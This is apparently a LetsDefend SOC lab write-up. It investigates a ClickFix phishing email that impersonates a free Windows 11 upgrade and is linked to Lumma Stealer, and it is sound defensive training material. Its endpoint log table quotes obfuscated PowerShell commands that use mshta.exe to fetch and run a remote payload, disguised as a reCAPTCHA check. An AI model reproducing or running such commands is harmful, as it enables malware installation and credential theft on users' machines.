# Overview
Investigation of a LetsDefend SOC alert involving a suspected ClickFix phishing email associated with Lumma Stealer. The investigation correlated email security data, threat intelligence, browser history, HTTP activity, and endpoint telemetry to determine whether the alert represented a true positive and what activity occurred on the affected host.

# Objective
Determine whether the alert is a True Positive or False Positive and take the appropriate action according to the playbook.

# Event Details
- EventID : 316
- Event Time : Mar, 13, 2025, 09:44 AM
- Rule : SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing
- Level : Security Analyst
- SMTP Address : 132.232.40.201
- Source Address : update@windows-update.site
- Destination Address : dylan@letsdefend.io
- E-mail Subject : Upgrade your system to Windows 11 Pro for FREE
- Device Action : Allowed
- Trigger Reason : Redirected site contains a click fix type script for Lumma Stealer distribution.
- Hint: Try to analyse website, if the domain is down, try to analyze it via any.run. Check the
processes for powershell execution. Check Log management for additional logs.

# Investigation / Approach
I wasn't familiar with Lumma Stealer so I did an internet search to quickly familiarize myself. I found useful information at [Malware-Traffic-Analysis.net](https://www.malware-traffic-analysis.net/2026/01/01/index.html) regarding the attack procedure consisting of HTTPS requests caused by commands for `mshta`.

Following the playbook...

## Parse the email
Under Email Security, searched for recipient `dylan@letsdefend.io`.
<img width="1605" height="187" alt="image" src="https://github.com/user-attachments/assets/4896a780-96fc-46af-9a8c-3aca5b7a3da1" />

Items confirmed against initial information from Event Details:
- Timestamp, `Mar, 13, 2025, 09:44 AM`
- Sender: `update@windows-update.site`
- Subject: `Upgrade your system to Windows 11 Pro for FREE`

There were no attachments. Hovering over the `UPGRADE NOW` button revealed `hxxps[:]//www.windows-update.site`. Windows products usually start with `microsoft.com` domain. This was suspicious.

## Threat Intelligence
Searched VirusTotal for `www[.]windows-update.site`
<img width="786" height="200" alt="image" src="https://github.com/user-attachments/assets/5c5d62fa-9c15-4717-bb31-c00c4dc0e5b2" />

SMTP IP address 132[.]232[.]40[.]201 was also suspicious but based on the score, I needed to investigate a bit further.
<img width="1817" height="207" alt="image" src="https://github.com/user-attachments/assets/942ea32d-f30b-4086-8a5a-cdbbd197768d" />
<img width="844" height="783" alt="image" src="https://github.com/user-attachments/assets/c99500b8-8a3f-4c3b-aa14-dd5d5cb78212" />

Relations tab confirmed `windows-update.site`
<img width="822" height="394" alt="image" src="https://github.com/user-attachments/assets/4568a286-cbcb-48b7-a2b1-2d77ca285dc3" />

Checked the SMTP IP on AbuseIPDB and found similar story of its malicious nature.
<img width="670" height="521" alt="image" src="https://github.com/user-attachments/assets/1cb7fc19-8fb2-4cc4-8ddf-a63731b7d160" />

Checked both `www[.]windows-update.site` and SMTP IP in Talos Threat Intelligence. SMTP IP address reputation was neutral but was not/no longer on the Block List. `www[.]windows-update.site`, however, was still on the Block List.
<img width="1268" height="650" alt="image" src="https://github.com/user-attachments/assets/aebdc0b9-6e58-4a77-aead-1c36ea6ff392" />

Based on threat intelligence, I found malicious/reported activity associated with the sender infrastructure. Since the Device Action status (ALLOWED) indicated that the email was delivered, the playbook's next recommended step was to delete the email.

## Determine Whether the User Interacted
In Log Management, I filtered for the event date and found two logs showing the malicious SMTP IP address. One for the incoming email to (SMTP port 25) and one outgoing HTTPS request (port 443) confirming access to the malicious site. I also noted the timestamp... email received at 9:44AM and the outgoing internet connection at 11:26PM, almost 14 hours after the email was received. This tracked with the behavior described in the Malware-Traffic-Analysis.net finding, where the outbound internet connection starts several hours after initial infection.

After confirmation, the endpoint was contained per playbook guidelines. 

Investigating EDR logs, I further confirmed access to the malicious site via browser history.
<img width="855" height="196" alt="image" src="https://github.com/user-attachments/assets/cec04055-6001-4728-b349-8cbe260622df" />

In the Terminal History, I found obfuscated powershell launcher invoking `mshta.exe`. Once again, calling back to information I found in Malware-Traffic-Analysis.net.

Date: Mar 13, 2025
    
| Time | Command Line |
| --- | --- |
| 23:26:19 | "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -w 1 powershell -Command ('ms\]\]\]ht\]\]\]a\]\]\].\]\]\]exe hxxps\[:\]//overcoatpassably\[.\]shop/Z8UZbPyVpGfdRS/maloy.mp4' -replace '\]') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824'' |
| 23:26:31 | "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -Command "mshta.exe hxxps\[:\]//overcoatpassably\[.\]shop/Z8UZbPyVpGfdRS/maloy.mp4" |
| 23:26:32 | "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe" -w 1 powershell -Command ('ms\]\]\]ht\]\]\]a\]\]\].\]\]\]exe hxxps\[:\]//overcoatpassably\[.\]shop/Z8UZbPyVpGfdRS/maloy.mp[](https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4)' -replace '\]') # ✅ ''I am not a robot - reCAPTCHA Verification ID: 3824'' |

## Artifacts
| Value | Comment | Type |
| --- | --- | --- |
| 132.232.40.201 | Malicious IP | IP  |
| 172.16.17.216 | Victim IP belonging to host Dylan | IP  |
| hxxps\[:\]//www\[.\]windows-update\[.\]site | Malicious site | URL |
| update@windows-update.site | Email sender | Email Sender |
| windows-update.site | Email domain | Email domain |

## Analyst Note
An alert was triggered on Mar, 13, 2025, 09:44 AM, for inbound email from sender update@windows-update.site with SMTP IP 132.232.40.201 to dylan@letsdefend.io at 172.16.17.216. The alert was generated because the email contained a link to `windows-update.site` which is associated with ClickFix phishing campaign. Analysis of HTTP and Endpoint Browser History logs  indicates the link was clicked thereby accessing the malicious site.

Verdict
True Positive

Actions Taken
The endpoint was contained, and the case was escalated to Tier 2 for further investigation.


# Analyst Perspective
The investigation demonstrated that no individual telemetry source provided the complete picture. Email telemetry established the initial phishing event, threat intelligence provided context about the infrastructure, browser history established user interaction, and endpoint telemetry revealed subsequent PowerShell activity.

The approximately 14-hour gap between the phishing email and endpoint execution also demonstrated the importance of timeline analysis. While the delay was significant, the available evidence was insufficient to determine exactly why it occurred. However, the findings on Malware-Traffic-Analysis.net supports the Lumma Stealer behavior for this particular case.

## Important Questions
- Is the email actually malicious?
- What does threat intelligence tell me about the sender infrastructure?
- Did the user click the link?
- What happened after the user visited the site?
- Why was there a ~14-hour gap before endpoint execution?
- What does the PowerShell command actually do?
- Does the evidence support the Lumma Stealer hypothesis?

## Skills Obtained
- Security alert triage
- Phishing investigation
- Threat intelligence analysis
- Email security investigation
- IOC analysis
- Log correlation
- Endpoint telemetry analysis
- Timeline reconstruction
- Incident containment and escalation
- Evidence-based incident reporting

## Tools Used
- LetsDefend
- VirusTotal
- AbuseIPDB
- Cisco Talos
- Email Security / Email Logs
- Browser History
- HTTP Logs
- Endpoint Telemetry

## Key Takeaways
- Correlating multiple telemetry sources can turn an isolated alert into a supported incident narrative.
- Timeline analysis can reveal important questions that individual events don't.
- Threat intelligence helps form a hypothesis, but conclusions should remain grounded in observed evidence.











